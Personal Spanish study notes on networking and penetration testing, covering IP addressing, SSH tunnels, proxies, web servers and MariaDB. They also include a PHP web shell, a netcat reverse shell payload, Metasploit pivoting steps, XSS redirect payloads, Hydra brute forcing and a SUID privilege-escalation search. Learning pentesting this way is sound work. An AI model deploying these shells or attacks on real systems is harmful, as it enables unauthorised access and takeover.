# Apuntes generales
Notas generales que me han parecido interesantes a lo largo de este tiempo, se irá autocompletando. Estais invitados a participar y hacerlo más grande.
Encontraréis cosas tipo:
- Redes.
- Protocolos.
- Comandos.
- Herramientas.

## LA IP ##

La IP es su identificación dentro de una red (TCP/IP).

	.Fijas
	.Dinámicas (DHCP)

Clases de IP's:
	
	- A (0.0.0.0 - 127.255.255.255)
	- B (128.0.0.0 - 191.255.255.255)
	- C (192.0.0.0 - 223.255.255.255)
	- D (224.0.0.0 - 239.255.255.255)
	- E (240.0.0.0 - 255.255.255.254)

## LA MASCARA ##

Método con el que el sistema es capaz de identificar los límites de la red en la que se encuentra.


## INTERNET ##

- Un sist. autonomo es un grupo de redes que se rigen por las mismas normas, es decir, las ultimas redes.
- Las ISP reservan sist. autonomos. Reservan pools de IP's.
- Cuando compras un servicio compras un rango del sist. autonomo.
- Los sist. autonomos se interconectan entre si con routers con el protocolo BGP (Border Gateway Protocol)

## NAT ##

Traduce las redes publicas a redes privadas.
EL port forwarding sirve para pivotar entre redes.
De fuera a dentro no se pueden conectar, pero de dentro a fuera si.

## VLAN ##

Es una red virtual que sirve como segmentación lógica dentro de una red.
Perfecto para aumentar la seguridad y separar las redes.
Suelen crearlo los switches.

## PUERTOS ##

Ver puertos abiertos en nuestra máquina: lsof -i -P -n

## SSH ##

Protocolo de acceso remoto a través de un canal seguro de datos.
El port forwarding permite ejecutar aplicaciones en remoto en tu PC desde otro con el argumento: -X
Para modificar archivo de configuracion: /etc/ssh/sshd_config

		## Tunel SSH

		- Creamos un tunel para conectarnos a una máquina que se encuentra en otro segmento de la red.
		- Estas dos máquinas tienen acceso entre sí aunque no esten en el mismo segmento.
		- Comprobación: Un ping a la IP.
		- Queremos saber si el puerto de RDP esta abierto, para ello: telnet IP_VICTIMA 3389 (Puerto de RDP)
		- Para crear el tunel:
		  -->ssh -L "IP's que se puedan conectar":"Puerto que vamos a abrir":"IP_VICTIMA_2":"Puerto RDP" Usuario:localhost
		  -->ssh -L 0.0.0.0:8080:192.168.X.X:3389 hacker@localhost	
		- Desde nuestra máquina: xfreerdp /v:IP_VICTIMA /u: USUARIO /port: PUERTO RDP
		- Cogemos un puerto externo y lo ponemos en nuestra maquina

		## Tunel remoto SSH

		- Sirve para abrir un puerto remoto y poder conectarse
		- ssh -R "puerto a abrir":"0.0.0.0":"puerto que esta en eschucha" "usuario"@"ip"
		- Cogemos un puerto nuestro y lo ponemos en su máquina
	
		## Tunel con metasploit
		
		1. Iniciamos msfconsole: $msfconsole
                2. Nos conectamos por SSH: use auxiliary/scanner/ssh/ssh_login
                3. Cambiamos la shell a meterpreter: use post/multi/manage/shell_to_meterpreter
                4. Nos metemos dentro de la sesión generada:
                        - Para listar las sesiones: sessions -l
                        - Para seleccionarla: sessions -i NumeroDeLaSesión

                5. Dentro de la consola de meterpreter, podemos hacer "help" para que nos muestre los comando, vamos a utilizar portfwd para hacer túneles dentro de la red.
                6. Portfwd:
                        - Túnel remoto: portfwd add -R -l {puertoLocal} -p {puertoRemoto} -L {DireccionRemota}
                        - Túnel local: portfwd add -l {puertoLocal} -p {puertoRemoto} -r {DireccionRemota}

## FTP ##

Es un protocolo de transferencia de archivos en texto claro, puerto predeterminado el 21.
Hay dos tipos: Activo (21 control y 20 transferencia) y Pasivo (21 contro y puertos altos transferencia).

Realizar conexion: ftp IP PORT
Subir archivos: put archivo
Descargar archivos: get archivo
Ejecutar comandos en tu ordenador local: !comando

## Proxy ##

ES un servidor intermediario que recibe peticiones y las reenvia hacia el destino de forma enmascarada.
Igual que una VPN pero no crea una red virtual.

	--> El proxy HTTP/HTTPS funciona como una web que recibe todas las peticiones web y las redirige a su destino.
	    En entornos corporativos solo suele dejar conectarse a HOSTNAME.

	--> El proxy Cache se utilizan para guardar peticiones realizadas con anterioridad.

	--> Proxy transparente, es como un firewall para peticiones web. 
	    Se utiliza como gateway y hace funciones de enrutado y filtrado.

	--> Proxy reverso, se dedica a recopilar las conexiones y filtrarlas hacia otro sistema interno de su red.
	    Mas comunes en el BLue team.

	## SOCKS proxy
	- Es un proxy que utiliza el protocolo SOCKS.
	- Permite abrir conexiones a cualquier sistema y puerto dentro de la red.
	- Funciona mejor que los túneles, ya que no está orientado a tunelizar un puerto.
	              ssh -D "PUERTO" -q -N -f usuario@ip

## HTTP ##

Las api rest, son las operaciones mas conocidas (POST, GET, PUT y DELETE), son unos servicios que nos facilitan las tareas.

	## Curl
	Software de linea de comandos que sirve para transferir datos a través de protocolos.
	Comandos:
		- curl -X OPTIONS "URL" (permite conocer que opciones tiene el servidor Web).
		- curl -X GET "URL" (obtener archivos)
		- man curl
		- Sacar archivo a través de un proxy socks5: curl -x socks5h://"IP":"PUERTO http://"Server":"P"


	## Wget
	wget "URL"

## Servidores Web ##

Es un software que aloja un motor web para gestionar las peticiones HTTP/HTTPS.
Segun server, crear reverse shell diferente.

	- Apache --> El más usado, generalmente con PHP como backend.
	- Nginx --> Balanceador de carga y proxy inverso.
	- IIS --> Team microsoft (ASP/ASPX)
	- Tomcat/Jetty --> Team Java (JSP)
	- Flask /django /jinja --> Team python.	

	## Docker
	- Instalación: 
		1º sudo apt-get install docker
		2º sudo apt-get install docker-compose
		3º systemctl start docker
	- Lanzarlo:
		. dvwa: docker run --rm -it -p 80:80 vulnerables/web-dvwa
		. phpmailer: docker run --rm -it -p 8080:80 vulnerables/cve-2016-10033

	## CMS
	Sirve para la gestión sencilla y centralizada de paginas webs. Problema: Gran cantidad de vuln.

	## Servidor Web con python
	--> python -m SimpleHTTPServer PUERTO
	--> python3 -m http.server PUERTO

	## Apache2
	- Crear un servidor, su directorio: /var/www
	- Aqui se pueden crear diferentes hosts, etc. Configuracion:
		- cd /etc/apache2 --> sites-available
		- Modificar 000-default...--> DocumentRoot
		- Añadir "Server name"
		- a2ensite 000-pagina1.conf
		- cd /etc/hosts --> Añadir los hosts al archivo
	- Dispone de autenticación básica (No es segura):
		- Copiarlo en la configuracion de página (/etc/apache2/000-pagina.conf)
				. Crear "Location"
				<Location />
			        AuthType Basic
				AuthName "Contenido restringido"
				AuthUserFile /etc/apache2/.htpasswd
				Require valid-user
				</Location>

		- Crear usuarios:
				. htpasswd -c /etc/apache2/.htpasswd USER
				. Password: 1234
	- Se pueden utilizar distintos lenguajes:

		# PHP
		- Para ejecutar comandos desde navegador:

		<?php
		echo exec ($_GET['cmd'])
		?>

		- Crear shell:
		
			. url/archivo.php?cmd=nc+127.0.0.1+4444+-e+%2Fbin%2Fbash
			. nc -lvp 4444
			. python -c 'import pty'; pty.spawn("/bin/sh")'
			. export TERM=xterm

## SQL ##

Es un lenguaje de Querys que se utiliza para realizar acciones en BD.
Ejemplos: mysql, mariadb, postgresql, etc.
Corre en el puerto 3306.
	
	## MariaDB
	Para lanzar el servicio: systemctl start mariadb.service
	--> Para hacer un pequeño hardening usar: mysql_secure_installation
	--> Crear BD: CREATE DATABASE; 
	--> Crear usuario: CREATE USER 'nombre'@'%' IDENTIFIED BY 'password'
	--> Dar acceso solo a una base de datos: GRANT ALL PRIVILEGES ON basedatos.tablas TO 'user'@'%'
	--> Seleccionar DB: use *nombre*
	--> Crear tabla: CREATE TABLE xxxxx (xxxx VARCHAR(20), xxxx INT(20), etc);
	--> Seleccionar datos de una tabla: SELECT * FROM alumnos;

## ATAQUES WEB ##

	## CSRF 
	Cross Site Request FOrgery, tipo de ataque que aprovecha el fallo en una web para que un usuario haga lo que no quiere.
	Un atacante descubre que pasando una URL con unos determinados parametros y el user se logea se ejecuta un request. 

	## Command injection
	Injectar código aprovechando que una web responde a las peticiones que le mandamos.

	## LFI & RFI
	Permite extraer archivos llegando a la raiz. Puede ser en local (LFI) o en remoto (RFI).

	## File Upload
	Cuando un server permite subir archivos, le injectamos código malicioso y lo ejecuta.

	## XSS
	Tipos:
		.reflected --> Se tiene que ejecutar manualmente
		.stored --> Se queda guardado y se ejecuta en cada recarga
	Código javascript para explotar.
	Fallo en el código que permite injectar código y realizar por ejemplo un Cookie hijacking, etc.
		. Injectamos código: <sript></script>
		. Dentro del body para omitir el <script/> utilizariamos --> <img src= >
		. Redirección a otra web: <img src=x onerror=window.location.replace("URL")>
					  <script> window.location.replace("https://facebook.com") </script> 
	## Fuerza bruta

		# Hydra

		- Ataque metodo GET/POST: hydra -l USER -P DICCIONARIO -s 80 -f PAGINA ATACAR http-get /pagina_Atacar/error_al_fallar -v

## PROTOCOLOS ##

	## SMB
	Protocolo que se usa para acceder y utilizar archivos en red. Se conoce como el sistema de archivos en red.
	Corre en el puerto 139 or 445.
	Script nmap: nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse IP

	## RPC
	ES un servidor que convierte el numero de programa de llamada en procedimiento remoto.
	Puerto 111.
	Script nmap: nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount IP

## OTROS ##

- Cuando estemos en un servidor sin permisos y queramos ejecutar un reverse shell, desplazarse a /tmp
- Buscar permisos SUID -->  find / -perm 4000 2>/dev/null
	
- Ejecutar comando con otro usuario:

        - Comando: sudo -u usuario /ruta/absoluta/programa
